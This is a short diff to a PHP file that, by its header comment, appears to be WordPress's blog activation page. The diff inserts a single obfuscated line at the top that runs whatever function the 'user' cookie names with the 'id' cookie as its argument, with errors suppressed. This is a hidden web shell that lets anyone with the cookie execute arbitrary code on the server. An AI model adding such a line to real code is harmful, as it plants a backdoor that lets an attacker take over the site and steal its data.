@@ -1,4 +1,8 @@
 <?php
+
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+
 /**
  * Confirms that the activation key that is sent in an email after a user signs
  * up for a new blog matches the key for that user and then displays confirmation.
